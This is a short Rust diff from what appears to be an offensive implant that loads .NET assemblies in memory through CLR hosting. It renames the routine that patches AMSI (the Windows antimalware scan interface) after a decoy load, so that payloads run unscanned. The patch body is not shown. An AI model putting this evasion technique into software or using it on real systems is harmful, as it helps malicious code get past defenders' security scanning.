@@ -19,7 +19,7 @@ use windows_sys::{
 };
 
 use crate::{
-    evasion::patch_amsi_if_ft_flag,
+    evasion::amsi::evade_amsi,
     execute::ffi::{
         _AppDomain, _Assembly, ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost, IUnknown,
     },
@@ -190,7 +190,7 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<String, Dotnet
     let _res = unsafe { load_3(app_domain as *mut _, p_decoy_sa, &mut sp_assembly) };
 
     // Now we can patch AMSI as it will have been loaded into the process by the above load_3
-    patch_amsi_if_ft_flag();
+    evade_amsi();
 
     // Reset assembly data and load the assembly with AMSI patched
     sp_assembly = null_mut();
